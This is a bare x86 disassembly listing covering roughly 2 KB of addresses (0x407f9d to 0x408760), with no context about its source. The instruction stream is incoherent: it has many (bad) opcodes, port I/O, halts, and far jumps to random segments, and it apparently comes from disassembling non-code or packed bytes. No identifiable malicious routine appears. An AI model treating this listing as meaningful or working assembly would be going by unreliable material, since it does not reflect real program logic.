  407f9d:	lods   al,BYTE PTR ds:[esi]
  407f9e:	pop    ds
  407f9f:	mov    ecx,0x3f108032
  407fa4:	lahf   
  407fa5:	pushf  
  407fa6:	jne    0x407fcd
  407fa8:	inc    esi
  407fa9:	xchg   ebx,eax
  407faa:	push   es
  407fab:	mov    eax,0x5215e0cc
  407fb0:	or     DWORD PTR [eax+0x10],esp
  407fb3:	aas    
  407fb4:	ins    DWORD PTR es:[edi],dx
  407fb5:	cmp    DWORD PTR [ecx],ecx
  407fb7:	sbb    edx,ebp
  407fb9:	mov    eax,0x98b289b
  407fbe:	pop    edi
  407fbf:	jl     0x407f90
  407fc1:	xlat   BYTE PTR ds:[ebx]
  407fc2:	jbe    0x407f52
  407fc4:	xor    eax,0xc69b6d2b
  407fc9:	stos   DWORD PTR es:[edi],eax
  407fca:	(bad)  
  407fcb:	shl    cl,0x93
  407fce:	ss push ds
  407fd0:	jno    0x407fab
  407fd2:	mov    ds:0xf0c5e476,al
  407fd7:	sbb    DWORD PTR [edi-0x1e],ebp
  407fda:	fdiv   DWORD PTR [edx+0x7efd48d2]
  407fe0:	xchg   esi,eax
  407fe1:	jp     0x407ff8
  407fe3:	lods   eax,DWORD PTR ds:[esi]
  407fe4:	inc    ecx
  407fe5:	add    BYTE PTR [edi],ah
  407fe7:	xchg   ecx,eax
  407fe8:	add    bh,ah
  407fea:	fcomip st,st(4)
  407fec:	fsubp  st(6),st
  407fee:	cmp    dl,cl
  407ff0:	in     al,0x8f
  407ff2:	xchg   DWORD PTR [eax+ecx*4+0x1c],eax
  407ff6:	ja     0x407f90
  407ff8:	ret    0x26f7
  407ffb:	xchg   BYTE PTR [eax-0x6a],al
  407ffe:	popa   
  407fff:	adc    DWORD PTR ss:0x4815876c,ebx
  408006:	arpl   WORD PTR [eax],sp
  408008:	dec    edx
  408009:	push   ebp
  40800a:	repz imul ebp,eax,0xf0dd25f7
  408011:	push   0xffffffbc
  408013:	inc    edi
  408014:	push   eax
  408015:	jmp    0xf756:0x52cf95a2
  40801c:	stos   DWORD PTR es:[edi],eax
  40801d:	add    DWORD PTR [edi+0x6e17ab65],ebp
  408023:	cmc    
  408024:	fnsave [ecx]
  408026:	or     al,0xb
  408028:	mov    eax,0xab10261b
  40802d:	ds dec esp
  40802f:	pop    ebp
  408030:	retf   
  408031:	test   al,0x1f
  408033:	sub    esi,esp
  408035:	or     eax,0x19f7651e
  40803a:	lock and ebp,ebp
  40803d:	loopne 0x408051
  40803f:	mov    ah,0xfc
  408041:	sub    BYTE PTR [esi-0x574f8c8f],0x66
  408048:	inc    eax
  408049:	sahf   
  40804a:	and    BYTE PTR ds:0x2d2e7b49,0x44
  408051:	cmc    
  408052:	int    0xb5
  408054:	sar    BYTE PTR [eax-0xc70300e],1
  40805a:	(bad)  
  40805b:	call   FWORD PTR [ecx+0x3d732e27]
  408061:	push   esp
  408062:	jno    0x408025
  408064:	ins    DWORD PTR es:[edi],dx
  408065:	xor    al,0xa4
  408068:	push   edi
  408069:	cmp    al,0x26
  40806b:	push   es
  40806c:	repz dec ecx
  40806e:	into   
  40806f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408070:	and    dl,BYTE PTR [ebx-0x33846831]
  408076:	ret    
  408077:	pop    edx
  408078:	push   esi
  408079:	fstp   DWORD PTR [ebx+0x6f]
  40807c:	int3   
  40807d:	fcmovnbe st,st(7)
  40807f:	out    0xe3,eax
  408081:	mov    edx,DWORD PTR [ebp-0x394961d6]
  408087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408088:	mov    edx,0xcb1f9354
  40808d:	push   ds
  40808e:	lods   eax,DWORD PTR ds:[esi]
  40808f:	call   0x7a2a:0x3e387eee
  408096:	or     al,0x3f
  408098:	mov    ebp,0x132a9a8c
  40809d:	jo     0x40807e
  40809f:	cmp    al,0xb6
  4080a1:	dec    ebx
  4080a2:	push   ecx
  4080a3:	aaa    
  4080a4:	xor    eax,0x55d9bc49
  4080a9:	call   0xcb143c3a
  4080ae:	xchg   DWORD PTR [edi+esi*8-0x48],edi
  4080b2:	pop    edi
  4080b3:	pop    edx
  4080b4:	outs   dx,DWORD PTR ds:[esi]
  4080b5:	(bad)  
  4080b6:	out    dx,al
  4080b7:	in     eax,0x95
  4080b9:	or     al,0xd9
  4080bb:	mov    cl,0x80
  4080bd:	and    eax,DWORD PTR [esi+0x10408efb]
  4080c3:	cmp    al,0x15
  4080c5:	ret    
  4080c6:	jp     0x408126
  4080c8:	mov    al,0xb3
  4080ca:	cli    
  4080cb:	cmp    BYTE PTR [edx+0x3f2846b4],dl
  4080d1:	nop
  4080d2:	cmp    al,0x52
  4080d4:	ja     0x408103
  4080d6:	lock dec esp
  4080d8:	pop    ecx
  4080d9:	bnd jmp 0x4080d1
  4080dc:	xchg   esi,eax
  4080dd:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080df:	mov    ch,0xfa
  4080e1:	cmp    edi,esi
  4080e3:	dec    esp
  4080e4:	add    al,0x74
  4080e6:	test   BYTE PTR [ebx-0x2d25b3ce],dh
  4080ec:	mov    al,BYTE PTR [eax+ebp*4+0x77af8362]
  4080f3:	jecxz  0x40810f
  4080f5:	popf   
  4080f6:	arpl   WORD PTR [edx-0x670ce1b1],cx
  4080fc:	test   ecx,ecx
  4080fe:	iret   
  4080ff:	data16 aas 
  408101:	dec    esp
  408102:	or     al,0x7a
  408104:	cmp    ch,BYTE PTR [esi+0x61]
  408107:	ss mov edx,0x12fe3784
  40810d:	out    dx,al
  40810e:	and    DWORD PTR [eax],edx
  408110:	hlt    
  408111:	mov    eax,0x820d5c46
  408116:	mov    ebx,esp
  408118:	pop    ecx
  408119:	(bad)  
  40811b:	xor    eax,0xb825108a
  408120:	mov    bh,0xac
  408122:	inc    esi
  408123:	sub    eax,0xa5effa1a
  408128:	mov    ds:0x89ad7ed9,eax
  40812d:	lea    esp,[esi+esi*4+0x2]
  408131:	inc    BYTE PTR [ecx-0x48f29c41]
  408137:	push   esi
  408138:	int3   
  408139:	out    0xd7,eax
  40813b:	jecxz  0x40816d
  40813d:	add    BYTE PTR ds:0xaae7c4e4,ch
  408143:	or     eax,0x85a63054
  408148:	inc    edx
  408149:	aas    
  40814a:	cmp    al,al
  40814c:	cmc    
  40814d:	hlt    
  40814e:	fucomp st(3)
  408150:	(bad)  
  408151:	jmp    0x305e:0xd6731d7b
  408158:	push   edx
  408159:	(bad)  
  40815a:	cdq    
  40815b:	lahf   
  40815c:	cmp    bl,BYTE PTR [eax+0x54]
  40815f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408160:	das    
  408161:	add    BYTE PTR [ebx+0x69b6f16b],cl
  408167:	push   es
  408168:	push   ss
  408169:	xchg   bp,ax
  40816b:	inc    edx
  40816c:	cmp    al,0x2b
  40816e:	adc    eax,0xbbf217d
  408173:	cli    
  408174:	mov    ebx,0x63b4668a
  408179:	fucom  st(4)
  40817b:	or     eax,0x868587bd
  408180:	out    0x3b,eax
  408182:	les    ebx,FWORD PTR [esi+ebx*4-0x486bf1d7]
  408189:	adc    ah,BYTE PTR [edi]
  40818b:	retf   0xf01a
  40818e:	cs neg ebx
  408191:	cmp    dh,BYTE PTR [eax+0xf]
  408194:	mov    esp,0xd844e4bc
  408199:	add    DWORD PTR [edx],0x33
  40819c:	clc    
  40819d:	div    DWORD PTR [esi]
  40819f:	xchg   DWORD PTR [ecx],esi
  4081a1:	sbb    BYTE PTR [ebx-0x2dcde52c],al
  4081a7:	cli    
  4081a8:	sar    BYTE PTR [eax*2+0xc91a744],0x27
  4081b0:	mov    dl,0x85
  4081b2:	cld    
  4081b3:	ins    DWORD PTR es:[edi],dx
  4081b4:	addr16 xchg edx,eax
  4081b6:	xchg   esi,eax
  4081b7:	dec    esp
  4081b8:	sub    esi,esi
  4081ba:	or     BYTE PTR [edx-0x24],ah
  4081bd:	cmp    BYTE PTR [ebp+ecx*8+0x42eaba14],bh
  4081c4:	or     DWORD PTR [eax+0x463f5f82],ebx
  4081ca:	cmp    BYTE PTR ds:0x8ac72477,ch
  4081d0:	into   
  4081d1:	gs jg  0x4081a3
  4081d4:	mov    edi,0x3b858115
  4081d9:	xchg   ecx,eax
  4081da:	jmp    0x4081c6
  4081dc:	mov    BYTE PTR [ebp-0x5604dc60],al
  4081e2:	popf   
  4081e3:	push   edx
  4081e4:	sbb    al,BYTE PTR [edx+edx*8]
  4081e7:	sub    al,0x94
  4081e9:	sub    bh,0x57
  4081ec:	je     0x408191
  4081ee:	adc    edx,DWORD PTR [esi+0x25]
  4081f1:	sti    
  4081f2:	cmp    BYTE PTR [esi-0x1f],0x34
  4081f6:	in     al,dx
  4081f7:	pop    edi
  4081f8:	cmp    BYTE PTR [ebp+0x60],dl
  4081fb:	dec    eax
  4081fc:	lods   al,BYTE PTR ds:[esi]
  4081fd:	iret   
  4081fe:	xchg   DWORD PTR [edx+0x17a322ab],esi
  408204:	mov    eax,ds:0xc39a8849
  408209:	fldenv [ebx-0x71]
  40820c:	in     al,0xc2
  40820e:	mov    bh,dh
  408210:	xor    dl,BYTE PTR [ecx-0x69]
  408213:	mov    bh,0xc
  408215:	cmp    DWORD PTR [eax-0x78],ebp
  408218:	es cs cmp al,0x76
  40821c:	and    al,0xa5
  40821e:	mov    bh,0x69
  408220:	into   
  408221:	lods   al,BYTE PTR ds:[esi]
  408222:	jnp    0x408260
  408224:	xor    dh,BYTE PTR [ebx-0x651ecf09]
  40822a:	add    al,BYTE PTR [edi-0x4]
  40822d:	lds    ebp,FWORD PTR [edi-0x246ae659]
  408233:	(bad)  
  408234:	out    dx,eax
  408235:	das    
  408236:	or     ah,BYTE PTR [edi]
  408238:	cmp    BYTE PTR [ecx*4+0x437d9750],0xf4
  408240:	das    
  408241:	int    0x3e
  408243:	xor    DWORD PTR [ebp+0x1b],0x48
  408247:	pop    ds
  408248:	mov    al,ds:0x4d35a2a6
  40824d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40824e:	rcr    BYTE PTR [ecx],1
  408250:	popa   
  408251:	pop    esp
  408252:	pop    ss
  408253:	xchg   ebx,eax
  408254:	nop
  408255:	mov    ebx,0xe7a88f72
  40825a:	mov    esp,0x737fe51b
  40825f:	addr16 push ebp
  408261:	lock mov ch,0x5f
  408264:	push   edi
  408265:	sbb    BYTE PTR [edi-0x3fe354a9],cl
  40826b:	aas    
  40826c:	pop    ds
  40826d:	xchg   ebp,eax
  40826e:	mov    BYTE PTR [edx-0x70f4d408],ah
  408274:	xchg   ebx,eax
  408275:	mov    edi,0xaa4adb44
  40827a:	or     al,cl
  40827c:	mov    al,ds:0x98e0e47d
  408281:	add    ch,bh
  408283:	pop    ebp
  408284:	outs   dx,BYTE PTR ds:[esi]
  408285:	inc    eax
  408286:	cmc    
  408287:	mov    BYTE PTR [ecx+ecx*8+0x6a],dl
  40828b:	cdq    
  40828c:	cmp    DWORD PTR [ecx+ebx*8-0x57],eax
  408290:	dec    ebx
  408291:	mov    ebx,0x35fb3139
  408296:	pop    esp
  408297:	add    ebx,0x1a5a3fab
  40829d:	mov    cl,0x8d
  40829f:	test   edx,ebx
  4082a1:	ret    0xd079
  4082a4:	sahf   
  4082a5:	ror    BYTE PTR [eax+0x5f671c84],1
  4082ab:	fstp   TBYTE PTR [ecx]
  4082ad:	stos   DWORD PTR es:[edi],eax
  4082ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082af:	inc    esp
  4082b0:	pop    ecx
  4082b1:	push   0xc
  4082b3:	or     al,bl
  4082b5:	push   cs
  4082b6:	mov    ah,0x8e
  4082b8:	pop    ecx
  4082b9:	clc    
  4082ba:	(bad)  
  4082bb:	and    bh,BYTE PTR [ebp+eax*1+0x56]
  4082bf:	xchg   esi,eax
  4082c0:	mov    esi,0xa713ec1b
  4082c5:	or     DWORD PTR [esi],ebp
  4082c7:	mov    eax,0x2a966f07
  4082cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082cd:	sub    ch,BYTE PTR [ecx-0x6e26c2e4]
  4082d3:	fs ins DWORD PTR es:[edi],dx
  4082d5:	push   ds
  4082d6:	fwait
  4082d7:	xor    DWORD PTR [edx],ebx
  4082d9:	mov    esi,0x7c4c01cc
  4082de:	aam    0xc8
  4082e0:	sub    eax,0x6b21e9d5
  4082e5:	inc    ebx
  4082e6:	jns    0x4082ff
  4082e8:	int    0xe2
  4082ea:	repnz cmp eax,0x93e0cc42
  4082f0:	jb     0x4082ba
  4082f2:	jl     0x4082f1
  4082f4:	pop    ecx
  4082f5:	jnp    0x4082f9
  4082f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082f8:	mov    cs,WORD PTR [eax+edi*1]
  4082fb:	mov    al,ds:0xcc087d55
  408300:	(bad)  
  408301:	gs xchg ebp,eax
  408303:	mov    al,ds:0x77dcf551
  408308:	and    DWORD PTR [ebx],ebx
  40830a:	add    eax,DWORD PTR [edx]
  40830c:	enter  0x86f3,0x1e
  408310:	dec    eax
  408311:	jecxz  0x40835c
  408313:	mov    WORD PTR [ebx],ds
  408315:	push   ss
  408316:	inc    ebx
  408317:	cli    
  408318:	mov    ebx,0xedf39246
  40831d:	ins    DWORD PTR es:[edi],dx
  40831e:	sahf   
  40831f:	pushf  
  408320:	or     DWORD PTR [edi+0x40],0x75
  408324:	mov    ds:0xd89e2e6f,eax
  408329:	data16 inc bx
  40832c:	repz jmp 0x19397e1d
  408332:	xor    BYTE PTR [edx+0x1e],al
  408335:	ss push ebx
  408337:	sub    BYTE PTR [eax-0x4aa35fd2],ch
  40833d:	add    DWORD PTR [ecx+ebp*2-0x30],ebx
  408341:	(bad)  
  408342:	hlt    
  408343:	sbb    al,0x90
  408345:	xchg   ebx,eax
  408346:	test   al,0x4e
  408348:	pop    eax
  408349:	cs xor al,0xd
  40834c:	scas   eax,DWORD PTR es:[edi]
  40834d:	jge    0x4082d9
  40834f:	mov    esp,0x5d0cca0f
  408354:	inc    ebx
  408355:	sbb    dl,BYTE PTR [edi-0x3e]
  408358:	gs clc 
  40835a:	mov    WORD PTR [edx+0x5e55c530],ds
  408360:	add    ecx,DWORD PTR [ebp+0x4a]
  408363:	imul   ecx,DWORD PTR [eax+0x1d],0x3f
  408367:	pusha  
  408368:	ret    0xd3b8
  40836b:	sbb    BYTE PTR [eax],bh
  40836d:	repnz sbb eax,DWORD PTR [esp+edx*4+0x5a14696b]
  408375:	dec    ebp
  408376:	pop    eax
  408377:	pop    ds
  408378:	sub    BYTE PTR [ecx-0x6c],ch
  40837b:	lea    ecx,[edi]
  40837d:	xchg   ecx,eax
  40837e:	cmp    BYTE PTR [eax-0x2d],ch
  408381:	mov    ss,ecx
  408383:	adc    DWORD PTR [ecx+0x34],ecx
  408386:	cwde   
  408387:	or     esp,DWORD PTR [ebx]
  408389:	mov    ch,0x7d
  40838b:	add    eax,0x9c665947
  408390:	ret    
  408391:	ja     0x408334
  408393:	shl    BYTE PTR [ebx],cl
  408395:	sti    
  408396:	in     al,dx
  408397:	dec    edi
  408398:	call   0xf85e8137
  40839d:	xchg   edx,eax
  40839e:	fs popf 
  4083a0:	cmp    BYTE PTR [edx+0x1b507cc],al
  4083a6:	pusha  
  4083a7:	mov    ch,0xea
  4083a9:	aad    0x28
  4083ab:	dec    edi
  4083ac:	into   
  4083ad:	ins    DWORD PTR es:[edi],dx
  4083ae:	jecxz  0x408425
  4083b0:	cmp    cl,BYTE PTR [ebp+0x5215e3e9]
  4083b6:	outs   dx,DWORD PTR ds:[esi]
  4083b7:	out    dx,al
  4083b8:	adc    dh,al
  4083ba:	ror    DWORD PTR [ebx-0x7d],cl
  4083bd:	pop    esi
  4083be:	dec    edx
  4083bf:	jg     0x4083b5
  4083c1:	sti    
  4083c2:	mov    DWORD PTR [edx-0x2b],ecx
  4083c5:	xor    eax,0x2d216e3b
  4083ca:	push   ebx
  4083cb:	mov    bl,0x3b
  4083cd:	mov    BYTE PTR [ebp-0x38],ah
  4083d0:	dec    eax
  4083d1:	cli    
  4083d2:	sbb    al,0x73
  4083d4:	jae    0x4083d2
  4083d6:	sbb    BYTE PTR [esp+ebx*2],0xc2
  4083da:	pop    es
  4083db:	sbb    al,0x16
  4083dd:	pushf  
  4083de:	jae    0x408397
  4083e0:	ss std 
  4083e2:	cmp    eax,0xd342f66a
  4083e7:	dec    eax
  4083e8:	pop    ds
  4083e9:	clc    
  4083ea:	jae    0x408373
  4083ec:	cdq    
  4083ed:	inc    ecx
  4083ee:	cmc    
  4083ef:	jmp    0x4083c8
  4083f1:	xor    al,0x12
  4083f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083f4:	mov    es,WORD PTR [eax]
  4083f6:	int3   
  4083f7:	adc    bh,BYTE PTR [esi-0x7e]
  4083fa:	sub    eax,0x3a848864
  4083ff:	adc    al,0x2e
  408401:	add    edx,ebp
  408403:	xchg   ebx,eax
  408404:	push   ebp
  408405:	outs   dx,DWORD PTR ds:[esi]
  408406:	loope  0x408438
  408408:	or     ebp,DWORD PTR [edx-0x16]
  40840b:	lods   al,BYTE PTR ds:[esi]
  40840c:	out    dx,al
  40840d:	or     dh,BYTE PTR [eax]
  40840f:	lods   eax,DWORD PTR ds:[esi]
  408410:	fcom   QWORD PTR [edi+ecx*1]
  408413:	inc    esi
  408414:	fcomp  QWORD PTR [ebp+0x20]
  408417:	in     eax,dx
  408418:	in     al,dx
  408419:	mov    dl,0x32
  40841b:	mov    dl,0x6
  40841d:	dec    ecx
  40841e:	(bad)  
  40841f:	lds    esi,FWORD PTR [esi+0x51]
  408422:	cdq    
  408423:	js     0x408472
  408425:	fs pop ds
  408427:	jg     0x408433
  408429:	sbb    ecx,DWORD PTR [ebx-0x22]
  40842c:	mov    edi,0xa31f205f
  408431:	sahf   
  408432:	mov    bl,0x66
  408434:	nop
  408435:	(bad)  
  408436:	pop    ebp
  408437:	imul   ebp,DWORD PTR [eax],0x182f2851
  40843d:	jb     0x40847b
  40843f:	loopne 0x4083dd
  408441:	jb     0x4083db
  408443:	das    
  408444:	into   
  408445:	mov    ds:0x14a609d7,eax
  40844a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40844b:	daa    
  40844c:	mov    dh,0xc
  40844e:	shl    ebp,1
  408450:	sub    al,0xed
  408452:	ins    BYTE PTR es:[edi],dx
  408453:	adc    al,0x6
  408455:	imul   ebx,DWORD PTR [ebx],0x6db163f7
  40845b:	sbb    BYTE PTR [edi+ebp*2],0xb2
  40845f:	js     0x4084c6
  408461:	lea    esp,[edx-0x57]
  408464:	mov    edx,0x78e0eefe
  408469:	int3   
  40846a:	push   ebx
  40846b:	in     eax,dx
  40846c:	xor    BYTE PTR [edi],ah
  40846e:	call   DWORD PTR [ebx+0x40d23534]
  408474:	(bad)  
  408475:	scas   eax,DWORD PTR es:[edi]
  408476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408477:	mov    bl,0x48
  408479:	into   
  40847a:	lock xor DWORD PTR [edx],esi
  40847d:	xchg   esi,eax
  40847e:	mov    WORD PTR [ebx],gs
  408480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408481:	imul   edx,DWORD PTR [ebx+0x19fd3919],0xffffffbc
  408488:	das    
  408489:	push   esi
  40848a:	cmp    DWORD PTR [eax],edi
  40848c:	cli    
  40848d:	nop
  40848e:	aam    0xeb
  408490:	int    0x1
  408492:	mov    ecx,0x2b83291f
  408497:	sti    
  408498:	sub    al,0xf8
  40849a:	cmp    al,0xc6
  40849c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40849d:	cmp    ch,BYTE PTR [ebx+0x685bd239]
  4084a3:	push   edx
  4084a4:	push   ds
  4084a5:	std    
  4084a6:	xchg   edx,eax
  4084a7:	jmp    DWORD PTR [edi+0x264c5ac3]
  4084ad:	sbb    DWORD PTR [eax],0xda17a089
  4084b3:	xchg   DWORD PTR [eax+edx*4],ebp
  4084b6:	in     al,0x55
  4084b8:	dec    ebp
  4084b9:	ins    BYTE PTR es:[edi],dx
  4084ba:	fild   DWORD PTR [ecx]
  4084bc:	sub    edx,DWORD PTR [eax-0x1e0d42de]
  4084c2:	into   
  4084c3:	mov    dh,0xd3
  4084c5:	inc    eax
  4084c6:	aad    0xd1
  4084c8:	fld    st(3)
  4084ca:	dec    eax
  4084cb:	pusha  
  4084cc:	mov    al,0x1f
  4084ce:	or     al,0xc7
  4084d0:	xor    bh,BYTE PTR [ebp+0x4d]
  4084d3:	jp     0x408499
  4084d5:	push   edi
  4084d6:	jb     0x40846b
  4084d8:	xor    DWORD PTR [edi+0x59],edi
  4084db:	in     al,0x2f
  4084dd:	out    0x3d,eax
  4084df:	dec    ecx
  4084e0:	jbe    0x4084a7
  4084e2:	ins    BYTE PTR es:[edi],dx
  4084e3:	popf   
  4084e4:	popf   
  4084e5:	xor    eax,ebp
  4084e7:	(bad)  
  4084e8:	mov    BYTE PTR [ecx],dh
  4084ea:	jp     0x40848d
  4084ec:	mov    esi,DWORD PTR [edx]
  4084ee:	mov    bh,0x60
  4084f0:	add    al,0x4d
  4084f2:	call   0xc312:0x51a24cf7
  4084f9:	imul   esp,DWORD PTR [ebx+0x7e96a897],0xcb929a77
  408503:	aaa    
  408504:	jo     0x4084a1
  408506:	in     al,0x37
  408508:	stc    
  408509:	stc    
  40850a:	aam    0xf1
  40850c:	jg     0x408570
  40850e:	fdivr  DWORD PTR [edi-0x6abdc71e]
  408514:	popa   
  408515:	mov    edi,0x5ef9f404
  40851a:	(bad)  
  40851b:	rcr    BYTE PTR [ebp-0x1bafed51],cl
  408521:	push   ebp
  408522:	mov    al,0x89
  408524:	ds inc esi
  408526:	test   eax,0xc6c24d5e
  40852b:	jo     0x4084fe
  40852d:	fdivr  QWORD PTR [ebp-0x75d003af]
  408533:	dec    edx
  408534:	call   0x7194d428
  408539:	and    bl,BYTE PTR [esi-0x3351ce2a]
  40853f:	iret   
  408540:	pop    es
  408541:	mov    ah,0xd6
  408543:	jne    0x40859e
  408545:	inc    eax
  408546:	aad    0xd4
  408548:	ror    edx,1
  40854a:	in     eax,dx
  40854b:	mov    al,ds:0xf2901b
  408550:	loop   0x4084df
  408552:	int3   
  408553:	bound  edi,QWORD PTR fs:[edi+esi*8+0x58453f86]
  40855b:	adc    eax,0x610d1271
  408560:	std    
  408561:	jg     0x4084ed
  408563:	adc    esi,esp
  408565:	add    ah,BYTE PTR [eax+0x57c5a31f]
  40856b:	cmp    al,0xe
  40856d:	adc    bh,ch
  40856f:	xchg   esi,eax
  408570:	enter  0xb48,0x87
  408574:	ret    
  408575:	xor    edx,ebp
  408577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408578:	mov    ch,cl
  40857a:	mov    esi,0x7816881c
  40857f:	adc    eax,0xdef18384
  408584:	sub    ebp,esi
  408586:	(bad)  
  408587:	cmp    al,0xa0
  408589:	dec    esp
  40858a:	pop    es
  40858b:	and    bl,BYTE PTR [eax+0x5f93812d]
  408591:	mov    bh,cl
  408593:	push   edi
  408594:	pop    esp
  408595:	xor    DWORD PTR [esi+0x683e9172],0x175cc9c6
  40859f:	adc    edx,ebx
  4085a1:	dec    edx
  4085a2:	repz imul DWORD PTR [esi-0x41]
  4085a6:	rcr    DWORD PTR [eax+0x14],0xd0
  4085aa:	pop    edx
  4085ab:	mov    ds:0xcad41c7c,al
  4085b0:	retf   
  4085b1:	cld    
  4085b2:	out    0x4b,eax
  4085b4:	pop    esi
  4085b5:	gs fwait
  4085b7:	sub    dl,ch
  4085b9:	jbe    0x40862d
  4085bb:	mov    ch,0x8
  4085bd:	cld    
  4085be:	in     eax,0x29
  4085c0:	push   es
  4085c1:	leave  
  4085c2:	push   ss
  4085c3:	cmp    bh,BYTE PTR [esi]
  4085c5:	or     eax,0x5fbaa876
  4085ca:	sub    al,0x1e
  4085cc:	loope  0x40856d
  4085ce:	add    eax,0x934feac0
  4085d3:	mov    dh,BYTE PTR [edi+0x59f6f35]
  4085d9:	sbb    ebp,ebx
  4085db:	je     0x4085e9
  4085dd:	and    BYTE PTR [esi-0x22],0xee
  4085e1:	add    al,0x41
  4085e3:	imul   ecx,DWORD PTR [eax+0x764ccd4d],0x684bb
  4085ed:	jge    0x40856f
  4085ef:	sbb    eax,0xcaef6837
  4085f4:	out    0xaf,al
  4085f6:	add    al,0x15
  4085f8:	ret    
  4085f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085fa:	sar    DWORD PTR [ebx+0x6e],0x62
  4085fe:	stc    
  4085ff:	jb     0x4085a8
  408601:	outs   dx,DWORD PTR ds:[esi]
  408602:	test   al,0x65
  408604:	pop    ss
  408605:	es cld 
  408607:	jp     0x408593
  408609:	ror    BYTE PTR [esi],0x1
  40860c:	scas   eax,DWORD PTR es:[edi]
  40860d:	into   
  40860e:	fld    TBYTE PTR [ebx-0x4946ec]
  408614:	fcom   QWORD PTR [edx]
  408616:	loop   0x40861d
  408618:	sbb    ebp,esi
  40861a:	adc    eax,0xcb01c029
  40861f:	outs   dx,BYTE PTR ds:[esi]
  408620:	inc    esi
  408621:	inc    eax
  408622:	retf   0xe336
  408625:	or     eax,0x4c874e7b
  40862a:	and    al,0x72
  40862c:	jmp    0x408665
  40862e:	lock jmp 0xd7de:0x7ebf4274
  408636:	das    
  408637:	sub    DWORD PTR [ebp-0x4c5b7c86],edx
  40863d:	lods   al,BYTE PTR ds:[esi]
  40863e:	(bad)  [edx+0x3c]
  408641:	sub    eax,0xd4c04772
  408646:	rcr    edx,0x48
  408649:	outs   dx,BYTE PTR ds:[esi]
  40864a:	push   edx
  40864b:	cs stos BYTE PTR es:[edi],al
  40864d:	in     eax,dx
  40864e:	jle    0x408624
  408650:	xor    ebx,DWORD PTR [edx]
  408652:	pop    eax
  408653:	hlt    
  408654:	daa    
  408655:	popa   
  408656:	popa   
  408657:	mov    ebx,0xa9df4581
  40865c:	sub    al,0x54
  40865e:	fwait
  40865f:	inc    esp
  408660:	adc    al,bh
  408662:	imul   esi,DWORD PTR [ebp+0x68],0x3
  408666:	scas   eax,DWORD PTR es:[edi]
  408667:	aam    0x77
  408669:	jnp    0x4085f8
  40866b:	push   ds
  40866c:	and    bl,ch
  40866e:	(bad)  
  40866f:	(bad)  
  408670:	imul   ebx,eax,0xffffffd1
  408673:	xor    DWORD PTR [edi-0x6b],0xf8e0bfd2
  40867a:	ret    0x5a08
  40867d:	jge    0x408650
  40867f:	test   DWORD PTR [ebx],0x52341c83
  408685:	cli    
  408686:	test   al,0xe
  408688:	jecxz  0x408686
  40868a:	in     al,0x3a
  40868c:	jbe    0x408646
  40868e:	push   ebx
  40868f:	inc    edi
  408690:	stos   BYTE PTR es:[edi],al
  408691:	fcom   DWORD PTR [ebp-0x6a209bbd]
  408697:	ss cli 
  408699:	in     eax,dx
  40869a:	imul   ecx,DWORD PTR [eax+0x44cba88a],0xdaecf0ed
  4086a4:	mov    ah,BYTE PTR [edi]
  4086a6:	adc    ebp,0xd671b273
  4086ac:	mov    bl,BYTE PTR [ebx+eax*2]
  4086af:	pop    edx
  4086b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b1:	pop    ds
  4086b2:	mov    cl,0x6c
  4086b4:	mov    bh,bl
  4086b6:	mov    edx,0x845ec634
  4086bb:	clc    
  4086bc:	cld    
  4086bd:	push   es
  4086be:	cmp    eax,0xf4efbc98
  4086c3:	push   0x32
  4086c5:	cmc    
  4086c6:	sbb    ecx,DWORD PTR [ebx]
  4086c8:	imul   ecx,DWORD PTR [edi],0x75302913
  4086ce:	mov    al,ds:0x1c334b19
  4086d3:	sub    edi,DWORD PTR [ecx]
  4086d5:	jne    0x4086a8
  4086d7:	mov    WORD PTR [edi],fs
  4086d9:	push   edx
  4086da:	adc    ecx,DWORD PTR ds:0xd877829b
  4086e0:	sub    ecx,0xb1f66b41
  4086e6:	mov    ah,0x4a
  4086e8:	mov    BYTE PTR [edx+0x3a],dh
  4086eb:	push   eax
  4086ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086ed:	cmp    eax,0x59474cf1
  4086f2:	sbb    BYTE PTR [ecx+eiz*4+0x71],dh
  4086f6:	outs   dx,BYTE PTR es:[esi]
  4086f8:	mov    esp,0x3061c37c
  4086fd:	(bad)  
  4086fe:	sbb    DWORD PTR [esi-0x261d9569],esp
  408704:	pop    es
  408705:	ret    0x156f
  408708:	jns    0x4086fd
  40870a:	push   esp
  40870b:	lea    ebx,[ebx+0x78c36cc4]
  408711:	push   edi
  408712:	fwait
  408713:	rol    DWORD PTR [edi],0x57
  408716:	mov    ah,0xb2
  408718:	push   ebp
  408719:	xor    ah,BYTE PTR ds:0x8bbcf84
  40871f:	jp     0x40875c
  408721:	pop    esp
  408722:	fdivr  DWORD PTR [esp+ecx*2-0x36]
  408726:	push   eax
  408727:	push   es
  408728:	out    dx,al
  408729:	cdq    
  40872a:	ds hlt 
  40872c:	pop    es
  40872d:	pop    ecx
  40872e:	inc    eax
  40872f:	adc    bh,BYTE PTR ds:0x36acd844
  408735:	jmp    0x179:0x4d1c6dfb
  40873c:	add    BYTE PTR [ebx+0x4ff2533d],dh
  408742:	pop    ss
  408743:	aad    0x88
  408745:	call   0x8991d199
  40874a:	cwd    
  40874c:	test   DWORD PTR [eax+0x6a],ebp
  40874f:	cli    
  408750:	test   eax,0xca004678
  408755:	test   eax,edi
  408757:	cmp    ebx,DWORD PTR [esi]
  408759:	xlat   BYTE PTR ds:[ebx]
  40875a:	and    eax,ebx
  40875c:	mov    esp,DWORD PTR [ecx-0x6d]
  40875f:	daa    
  408760:	stos   BYTE PTR es:[edi],al
